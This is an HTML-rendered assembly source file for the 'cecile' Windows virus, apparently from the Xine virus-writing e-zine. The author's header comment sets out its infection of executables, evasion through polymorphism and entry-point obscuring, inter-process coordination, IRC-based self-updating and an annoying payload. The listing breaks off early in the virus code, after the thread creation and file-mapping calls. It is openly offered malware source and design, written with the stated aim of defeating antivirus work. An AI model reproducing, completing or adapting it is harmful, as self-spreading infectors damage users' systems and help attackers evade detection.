<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>cecile.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	font-weight: bold;
	color: #0080C0;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">

</span><span class="sc1">;                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                                             ³ Xine - issue #5 - Phile 206 ³</span><span class="sc0">
</span><span class="sc1">;                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">





</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                    StarZero present the cecile virus </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  The code provided here is cautious, can be defectuous or have unstable </span><span class="sc0">
</span><span class="sc1">; behaviour, it has been tested on various conditions, and passed the tests,</span><span class="sc0">
</span><span class="sc1">; if something goes wrong, don't point at me and shout I'm a lamer as some</span><span class="sc0">
</span><span class="sc1">; poeple easily do so. I'm just programming for own pleasure, learning and </span><span class="sc0">
</span><span class="sc1">; studying new topics, so I do what I think interresting, but I'm not</span><span class="sc0">
</span><span class="sc1">; renumerated and I'm even not a professional. Im just an human, doing errors </span><span class="sc0">
</span><span class="sc1">; and learning from them, but Im also a very busy coder. If you meet any </span><span class="sc0">
</span><span class="sc1">; problems or bugs, better than critizing, please notify them to me. I will </span><span class="sc0">
</span><span class="sc1">; see what I can do. thanks</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  I started this virus in end of august 2000 with a mini idea, why not make</span><span class="sc0">
</span><span class="sc1">; a virus based on 3 (after 4) flexibe routine, by using pointers to routines.</span><span class="sc0">
</span><span class="sc1">; Well, at begining I planned 3 weeks to write this. Then finally, many</span><span class="sc0">
</span><span class="sc1">; technology came after and made the project growing dramatically.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; As usual, I rewrote everything from the beginning, and each time trying</span><span class="sc0">
</span><span class="sc1">; to improve already done work. This virus is very different of other in</span><span class="sc0">
</span><span class="sc1">; his philosophy/coding style. Let have a small tour of the virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + The first point in this virus is his special residency, a common virus</span><span class="sc0">
</span><span class="sc1">; start, modify the system, derivate some function or not, stay in the</span><span class="sc0">
</span><span class="sc1">; memory and then leave, this virus do other way. The virus run, allocate</span><span class="sc0">
</span><span class="sc1">; threads, and return to host. Threads use some interprocess to communicate</span><span class="sc0">
</span><span class="sc1">; with other cecile hinstances. (Well, without watching any other sources)</span><span class="sc0">
</span><span class="sc1">; To perform such action, it use a given client/server mechanism on win32</span><span class="sc0">
</span><span class="sc1">; machine to manage windows. To have a general memory between hinstances,</span><span class="sc0">
</span><span class="sc1">; the virus use a common shared temporary file wich vary from a machine</span><span class="sc0">
</span><span class="sc1">; to an other. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + An other interprocess communication ability was provided by a memory</span><span class="sc0">
</span><span class="sc1">; mapped file that each hinstance try to open, this file is different on</span><span class="sc0">
</span><span class="sc1">; each machine, this memory mapped file is then filled with needed</span><span class="sc0">
</span><span class="sc1">; structure.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + Queen/bee ability are then possible as viruses are able to communicate</span><span class="sc0">
</span><span class="sc1">; in an easy way, receiving and sending message. The virus first register</span><span class="sc0">
</span><span class="sc1">; themself to a server. If the server die, it's able to be remplaced by a</span><span class="sc0">
</span><span class="sc1">; bee. The queen never open a file if there exist at least one bee runned,</span><span class="sc0">
</span><span class="sc1">; the bee are there to infect file, the server find just executable among</span><span class="sc0">
</span><span class="sc1">; all the fixed disk connected on the machine. The queen/bee have a timer</span><span class="sc0">
</span><span class="sc1">; attached to their windowproc wich force them to update their ping each</span><span class="sc0">
</span><span class="sc1">; 50 ms, for detecting server crash, and remplace it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + The searching mechanism is not a standard recursive directory tree,</span><span class="sc0">
</span><span class="sc1">; using the common shared memory, it's able to resist a cold boot, a server</span><span class="sc0">
</span><span class="sc1">; crash of what ever else. It also use the timer to scan a directory only</span><span class="sc0">
</span><span class="sc1">; each seconds, making less suspect disk activity (I think it's enough that</span><span class="sc0">
</span><span class="sc1">; way), then each 2.5 seconds, it try to infect a file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + File are registered in the common memory, it have a maximum of 5000 </span><span class="sc0">
</span><span class="sc1">; saved filenames, each file have a dword telling about his state, if the</span><span class="sc0">
</span><span class="sc1">; file was denied because already open, if the file was not a PE, if the</span><span class="sc0">
</span><span class="sc1">; file was not a MZ, if it was infected, infected with wich version ? If it</span><span class="sc0">
</span><span class="sc1">; need to be updated, etc etc etc...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + For that, it cooperate via the common memory with the infection module</span><span class="sc0">
</span><span class="sc1">; by two way, providing the must updated image of the virus to drop to file,</span><span class="sc0">
</span><span class="sc1">; and also via sending a series of value passed to the infector. As I said</span><span class="sc0">
</span><span class="sc1">; it's not the queen that infect the file, it may be a much recent virus</span><span class="sc0">
</span><span class="sc1">; with other infection technique. It drop a virus image put in a bank. Bank</span><span class="sc0">
</span><span class="sc1">; are free common memory free for every infection process, there's 32</span><span class="sc0">
</span><span class="sc1">; (yes I know, it's a bit excessive).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + The infection process is a bit complex, improving axelle bailey virus</span><span class="sc0">
</span><span class="sc1">; infection, this one totally kill the relocs, as they don't exist anymore</span><span class="sc0">
</span><span class="sc1">; in a cleaner way wich make less heuristic the virus presence. Today on</span><span class="sc0">
</span><span class="sc1">; normal application programs, after it process a complex, but compatible</span><span class="sc0">
</span><span class="sc1">; with other infection style infection, wich mean that the return to host</span><span class="sc0">
</span><span class="sc1">; stay the same and mean that if you change on disk the virus, the binary</span><span class="sc0">
</span><span class="sc1">; will still work. This ability of flushing himself to disk is funky eh :-)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + The infection was previewved via a call patching, this can be builded or</span><span class="sc0">
</span><span class="sc1">; can be hooked via EPO, to perform epo, the virus don't watch for an api,</span><span class="sc0">
</span><span class="sc1">; but make a mini program tracing from the entrypoint, instruction by</span><span class="sc0">
</span><span class="sc1">; instruction, looking for the good call, and not one of the first calls.</span><span class="sc0">
</span><span class="sc1">; This mean for disinfection, you need to restore this call. This call is</span><span class="sc0">
</span><span class="sc1">; not derivated directly outside the section, but to a routine dropped on</span><span class="sc0">
</span><span class="sc1">; the code section witch will dispatch to the polymorphic entrypoint, and</span><span class="sc0">
</span><span class="sc1">; there's no hardcoded jump outside the code section, and the code section</span><span class="sc0">
</span><span class="sc1">; is not writable. :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + To perform tracing, the infection use a very small 8086 disassembler</span><span class="sc0">
</span><span class="sc1">; able to disassemble up to 486 instructions, it works quite well and passed</span><span class="sc0">
</span><span class="sc1">; many tests, it's not the first of this style I wrote, this one was very</span><span class="sc0">
</span><span class="sc1">; optimized and finally took just 2,5 kilobyte, enjoyable no ? So I tought I</span><span class="sc0">
</span><span class="sc1">; may apply it to Cecile, wich make the virus a bit much,mmm sexy :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + The infection dispatch to the poly module, the polymorphic engine was</span><span class="sc0">
</span><span class="sc1">; the primary reason of this virus, as aldebaran, I hope this virus will</span><span class="sc0">
</span><span class="sc1">; make honor to it, it's also very nice, and I hope, will make avers</span><span class="sc0">
</span><span class="sc1">; work quite much difficult. The input/output of this poly will be the</span><span class="sc0">
</span><span class="sc1">; reference for future poly for cecile, if I decide to swap it a day. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + On 20 november, the virus show his payload, once again, it's a graphical</span><span class="sc0">
</span><span class="sc1">; payload, the virus swap resolution to 640x480x16 bpp and make a nice</span><span class="sc0">
</span><span class="sc1">; little opengl animation. The opengl animation assume a 3D world, with</span><span class="sc0">
</span><span class="sc1">; lights, camera, and rotation, don't think it's hard to do, it's about 800</span><span class="sc0">
</span><span class="sc1">; lines. It display three plane of squares passing from far to the bottom</span><span class="sc0">
</span><span class="sc1">; of the screen, where little squares describe the copyright text. It also</span><span class="sc0">
</span><span class="sc1">; try annoy the user and do not permit him to swap to other application.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; + The network module is not a worm, but a normal network module permitting</span><span class="sc0">
</span><span class="sc1">; to viruses principally to exchange datas, updated modules in fact between</span><span class="sc0">
</span><span class="sc1">; them, for that, they use a multi-layer system. Multilayer was done in</span><span class="sc0">
</span><span class="sc1">; compatibility between routines. In fact, there's 5 layers, one who manage</span><span class="sc0">
</span><span class="sc1">; the internet connection, the level 1, one who manage irc operations, layer</span><span class="sc0">
</span><span class="sc1">; 2, one who manage channel operation level 3, one who manage the</span><span class="sc0">
</span><span class="sc1">; virus-2-virus protocol level 4, and the data exchanging protocol, level 5.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + Finally, irc is usefull as a meet point, cecile connect with 3 variable</span><span class="sc0">
</span><span class="sc1">; letters, and then 4 digits that is their code. The letters vary in function</span><span class="sc0">
</span><span class="sc1">; of the digit, then everybody can't be a cecile hinstance, they join a</span><span class="sc0">
</span><span class="sc1">; channel, wich vary each week, then display that they are aivable by</span><span class="sc0">
</span><span class="sc1">; sending a message. Messages are locked with a CRC, the crc depend of</span><span class="sc0">
</span><span class="sc1">; sender. Then it search for an other aivable cecile connected, and start</span><span class="sc0">
</span><span class="sc1">; connection. They both give their module versions. If any module version is</span><span class="sc0">
</span><span class="sc1">; updated, then they request the data sending. Data sending is a series of</span><span class="sc0">
</span><span class="sc1">; 50 byte packets of module x, wich contain a packet CRC check, an</span><span class="sc0">
</span><span class="sc1">; encryption, a total crc check, and a few much verification. Then it may</span><span class="sc0">
</span><span class="sc1">; update the virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + Ah, yes I forgot to talk about the updating mechanism, the updating</span><span class="sc0">
</span><span class="sc1">; mechanism work in two ways, the virus may flush module to bank 33, at init</span><span class="sc0">
</span><span class="sc1">; but for that, you need that the virus is running on the machine. So, I </span><span class="sc0">
</span><span class="sc1">; put an other way of updating, by dropping the module at bank 34, if the</span><span class="sc0">
</span><span class="sc1">; modules at bank 34 are better than the one in bank 33, then the virus</span><span class="sc0">
</span><span class="sc1">; rebuild just modules from bank 34. To avoid updating while copying image</span><span class="sc0">
</span><span class="sc1">; to virus bank, it use an userlevel method. If nobody is using bank 33,</span><span class="sc0">
</span><span class="sc1">; then bank 34 is flushed to bank 33. Also, modules are limited to be</span><span class="sc0">
</span><span class="sc1">; 8 ko long, but I think it's sufficient, well anyway, all that is constants</span><span class="sc0">
</span><span class="sc1">; and can be modified quite easily.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + Also, the virus use two things a bit different, first of all, it doesn't</span><span class="sc0">
</span><span class="sc1">; use delta pointers as register, but a macro call loadpointer. Some poeple</span><span class="sc0">
</span><span class="sc1">; may think it's useless, no, it's okay for many reason, 1st coz the kernel</span><span class="sc0">
</span><span class="sc1">; don't use too much the ebp but prefer to play with stack. Also, the</span><span class="sc0">
</span><span class="sc1">; infection module use ebp for other reasons, and it's not something bad.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + The virus also use a macro to call api. There's two calling method. If</span><span class="sc0">
</span><span class="sc1">; the api is normal, then the api memory entrypoint is calculated real-time</span><span class="sc0">
</span><span class="sc1">; and not saved to a virus table. In some apps, the api calling have to</span><span class="sc0">
</span><span class="sc1">; be very fast, as in the payload, the virus then manage his own memory</span><span class="sc0">
</span><span class="sc1">; table in a temporary buffer, a bit of stack as exemple. The Fast apicall</span><span class="sc0">
</span><span class="sc1">; and apicall are two routines that call apis just via the crc,</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + The virus have internal library handle, to keep the win32 spirit of</span><span class="sc0">
</span><span class="sc1">; importing library, the virus have 16 own imported library handle. So</span><span class="sc0">
</span><span class="sc1">; module can import their own library, like winsock (12) or user32 (1)</span><span class="sc0">
</span><span class="sc1">; kernel(0).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + Also, the virus is able to perform a flexible linking from module to</span><span class="sc0">
</span><span class="sc1">; kernel/other module function to power up their possibility. Instead of</span><span class="sc0">
</span><span class="sc1">; sharing many function, this virus share just a few one, given by number</span><span class="sc0">
</span><span class="sc1">; code, This mean that two different kernel with different shared function</span><span class="sc0">
</span><span class="sc1">; will be not compatible, but that's one of cecile limitation</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; okay, hope it pleased you, today I'm a bit bored of this virus, I want</span><span class="sc0">
</span><span class="sc1">; to pass to something else, keep tuned, and finally, this virus is</span><span class="sc0">
</span><span class="sc1">; an offrand to a person "far" from me, in all sense of the word, c'est la</span><span class="sc0">
</span><span class="sc1">; vie...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc2">.586P</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CreateWindowExA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00400000h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">startnow</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateWindowExA</span><span class="sc0">

</span><span class="sc5">VirusStart</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">starthere</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   a bee is runned, we participate to the comunauty</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">destination</span><span class="sc4">,</span><span class="sc5">origin</span><span class="sc4">,</span><span class="sc5">tst</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">&amp;</span><span class="sc5">tst</span><span class="sc4">&amp;</span><span class="sc5">_map</span><span class="sc0">
</span><span class="sc4">&amp;</span><span class="sc5">tst</span><span class="sc4">&amp;</span><span class="sc5">_map</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],&amp;</span><span class="sc5">origin</span><span class="sc4">&amp;-&amp;</span><span class="sc5">tst</span><span class="sc4">&amp;</span><span class="sc5">_map</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">&amp;</span><span class="sc5">destination</span><span class="sc4">&amp;,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc9">endm</span><span class="sc0">
    
</span><span class="sc5">Fapicall</span><span class="sc0">        </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">apicode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">kkva</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">handle</span><span class="sc0">
            </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">fastcall</span><span class="sc4">,&amp;</span><span class="sc5">kkva</span><span class="sc4">&amp;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">apicode</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">ExtendedApiCall</span><span class="sc0">

            </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">apicall</span><span class="sc0">         </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">apicode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">handle</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">apicode</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ApiCallit</span><span class="sc0">

            </span><span class="sc9">endm</span><span class="sc0">

            </span><span class="sc5">structfil</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc5">nullsize</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc5">bankcommsize</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
            </span><span class="sc5">banksize</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
            </span><span class="sc5">modulesize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8192</span><span class="sc0">

</span><span class="sc5">filsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8096</span><span class="sc4">+(</span><span class="sc5">structfil</span><span class="sc4">*</span><span class="sc2">5000</span><span class="sc4">)+(</span><span class="sc5">banksize</span><span class="sc4">*</span><span class="sc2">34</span><span class="sc4">)+(</span><span class="sc5">bankcommsize</span><span class="sc4">*</span><span class="sc2">32</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; mapped file structure</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   0 - 16              queen self data managing</span><span class="sc0">
</span><span class="sc1">;   16 - 4096           bees register zone</span><span class="sc0">
</span><span class="sc1">;   4096 - 8096             file finder reserved data</span><span class="sc0">
</span><span class="sc1">;   8086 - structfil * 5000     saved found file data</span><span class="sc0">
</span><span class="sc1">;   bankcommsize * 32</span><span class="sc0">
</span><span class="sc1">;   banksize 0-32 + 33 and 34 wich are managing</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;   extended header was added in finder area + 1024+768</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Init0</span><span class="sc0">


</span><span class="sc5">startnow</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Api_init</span><span class="sc0">

    </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">user32</span><span class="sc4">,</span><span class="sc5">i2</span><span class="sc0">           </span><span class="sc1">; load user32.dll</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; getmodul it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; into dll bank 1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">loadhandle</span><span class="sc0">
    
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skiploadit</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">InitThread</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">i1</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0">     </span><span class="sc2">0CA2C0A90h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Create Thread</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModuleCall</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc5">skiploadit</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Fini0</span><span class="sc0">

</span><span class="sc5">InitThread</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;   int 3</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   push    4               ; PAGE_READWRITE</span><span class="sc0">
</span><span class="sc1">;   push    1000h</span><span class="sc0">
</span><span class="sc1">;   push    4096</span><span class="sc0">
</span><span class="sc1">;   push    0</span><span class="sc0">
</span><span class="sc1">;   call    VirtualAlloc</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   mov esp,eax</span><span class="sc0">
</span><span class="sc1">;   add esp,4096</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">32</span><span class="sc0">    
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">fastcall</span><span class="sc4">,</span><span class="sc5">fs1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">repz</span><span class="sc0">        </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'ce0'</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000F001Fh</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">837E5818h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; OpenFileMappingA</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">startfromhere</span><span class="sc0">




    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">128</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">2AEB9EB2h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; GetComputerName</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

